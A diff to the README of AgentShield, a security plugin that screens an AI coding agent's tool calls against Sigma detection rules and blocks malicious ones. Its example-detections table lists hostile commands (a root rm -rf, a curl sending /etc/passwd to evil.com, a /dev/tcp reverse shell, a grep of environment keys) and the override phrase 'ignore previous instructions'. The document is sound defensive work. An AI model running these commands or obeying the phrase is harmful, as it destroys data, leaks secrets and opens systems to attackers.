@@ -1,42 +1,40 @@
 # AgentShield for Claude Code
 
-Real-time security monitoring for Claude Code using [AgentShield](https://github.com/agentshield-ai/agentshield).
+Real-time security monitoring for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) using [AgentShield](https://github.com/agentshield-ai/agentshield).
 
-Intercepts tool calls (Bash, Write, Edit, etc.) via Claude Code's [hooks system](https://docs.anthropic.com/en/docs/claude-code/hooks), evaluates them against Sigma detection rules, and blocks malicious activity before it executes.
+This plugin intercepts tool calls (Bash, Write, Edit, and others) via Claude Code's [hooks system](https://docs.anthropic.com/en/docs/claude-code/hooks), evaluates them against [Sigma](https://sigmahq.io/) detection rules (a standardised format for describing log-based detection patterns), and blocks malicious activity before it executes.
 
-## How it works
+## How It Works
 
 ```
-Claude Code → PreToolUse hook → AgentShield Engine → allow/block
+Claude Code  -->  PreToolUse hook  -->  AgentShield Engine  -->  allow / block
 ```
 
 When Claude Code is about to execute a tool call, the hook:
-1. Reads the tool name and parameters from stdin (JSON)
-2. Sends them to the AgentShield engine for evaluation
-3. Returns `exit 0` (allow) or `exit 2` with a block reason
+
+1. Reads the tool name and parameters from stdin (JSON).
+2. Sends them to the AgentShield engine for evaluation via `POST /api/v1/evaluate`.
+3. Returns `exit 0` (allow) or `exit 2` with a block reason.
 
 ## Prerequisites
 
-- [AgentShield engine](https://github.com/agentshield-ai/agentshield-engine) running on `localhost:8432`
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed
-- `jq` and `curl` available in PATH
+- AgentShield engine running locally (see the [main README](../../README.md) for build instructions). The default endpoint is `http://127.0.0.1:8433`.
+- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed.
+- `jq` and `curl` available in `PATH`.
 
-## Install
+## Installation
+
+Run the bundled installer from the plugin directory:
 
 ```bash
-# 1. Clone this repo
-git clone https://github.com/agentshield-ai/agentshield-claude.git
-cd agentshield-claude
-
-# 2. Run the installer
-./install.sh
-
-# 3. Add the hook to Claude Code (via /hooks menu or manually)
+./plugins/claude/install.sh
 ```
+
+The installer copies the hook script to `~/.agentshield/` and prints instructions for registering it with Claude Code.
 
 ### Manual configuration
 
-Add to `~/.claude/settings.json`:
+Alternatively, add the hook directly to `~/.claude/settings.json`:
 
 ```json
 {
@@ -56,17 +54,19 @@ Add to `~/.claude/settings.json`:
 }
 ```
 
-## What it catches
+## Example Detections
 
-| Attack | Rule | Action |
-|--------|------|--------|
-| `sudo rm -rf /` | Privilege Escalation Attempt | 🛡️ Blocked |
-| `curl -X POST http://evil.com -d @/etc/passwd` | Data Exfiltration via HTTP | 🛡️ Blocked |
-| `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Reverse Shell Attempt | 🛡️ Blocked |
-| Write file with "ignore previous instructions" | Prompt Injection via File Write | 🛡️ Blocked |
-| `env \| grep -i key` | Environment Variable Enumeration | 🛡️ Blocked |
-| `ls /tmp` | — | ✅ Allowed |
-| `git status` | — | ✅ Allowed |
+The following table illustrates representative detections from the current rule set. Actual behaviour depends on the evaluation mode and the active rules.
+
+| Tool call | Matched rule | Action |
+|-----------|-------------|--------|
+| `sudo rm -rf /` | Privilege Escalation Attempt | Blocked |
+| `curl -X POST http://evil.com -d @/etc/passwd` | Data Exfiltration via HTTP | Blocked |
+| `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Reverse Shell Attempt | Blocked |
+| Write file containing "ignore previous instructions" | Prompt Injection via File Write | Blocked |
+| `env \| grep -i key` | Environment Variable Enumeration | Blocked |
+| `ls /tmp` | (none) | Allowed |
+| `git status` | (none) | Allowed |
 
 ## Configuration
 
@@ -74,26 +74,26 @@ Environment variables:
 
 | Variable | Default | Description |
 |----------|---------|-------------|
-| `AGENTSHIELD_URL` | `http://127.0.0.1:8432` | AgentShield engine URL |
-| `AGENTSHIELD_MODE` | (engine default) | Override evaluation mode: `enforce`, `audit`, `shadow` |
+| `AGENTSHIELD_URL` | `http://127.0.0.1:8433` | AgentShield engine URL |
+| `AGENTSHIELD_MODE` | (engine default) | Override evaluation mode: `enforce`, `audit`, or `shadow` |
 
-## Evaluation modes
+## Evaluation Modes
 
-- **enforce** — blocks malicious tool calls (default)
-- **audit** — logs everything, never blocks (good for testing)
-- **shadow** — silent evaluation, no blocking or logging
+- **enforce** -- blocks tool calls that match high/critical-severity rules; requires approval for medium severity (default).
+- **audit** -- logs all alerts but never blocks. Useful for initial deployment and testing.
+- **shadow** -- silent evaluation with no blocking or user-visible alerts. Useful for baseline measurement.
 
-Start in audit mode to see what would be blocked:
+To start Claude Code in audit mode and observe what would be blocked:
 
 ```bash
 AGENTSHIELD_MODE=audit claude
 ```
 
-## Fail-open behaviour
+## Fail-Open Behaviour
 
-If the AgentShield engine is unreachable (not running, network issue), the hook **allows all tool calls** to avoid breaking Claude Code. The 2-second timeout ensures minimal latency impact.
+If the AgentShield engine is unreachable (not running, network issue), the hook **allows all tool calls** to avoid disrupting Claude Code. A 2-second timeout limits latency impact.
 
-## Tool mapping
+## Tool Mapping
 
 | Claude Code Tool | AgentShield Field |
 |-----------------|-------------------|
@@ -104,11 +104,11 @@ If the AgentShield engine is unreachable (not running, network issue), the hook 
 
 ## Related
 
-- [agentshield](https://github.com/agentshield-ai/agentshield) — main project
-- [agentshield-engine](https://github.com/agentshield-ai/agentshield-engine) — Go detection engine
-- [agentshield-rules](https://github.com/agentshield-ai/agentshield-rules) — Sigma detection rules
-- [agentshield-openclaw](https://github.com/agentshield-ai/agentshield-openclaw) — OpenClaw plugin
+- [AgentShield](https://github.com/agentshield-ai/agentshield) -- main project repository
+- [OpenClaw plugin](../openclaw/) -- TypeScript plugin for OpenClaw agents
+- [Detection rules](../../rules/) -- Sigma rule corpus
+- [API reference](../../docs/api.md) -- Engine HTTP API documentation
 
-## License
+## Licence
 
-Apache 2.0
+Apache 2.0 -- see [LICENSE](../../LICENSE) for details.
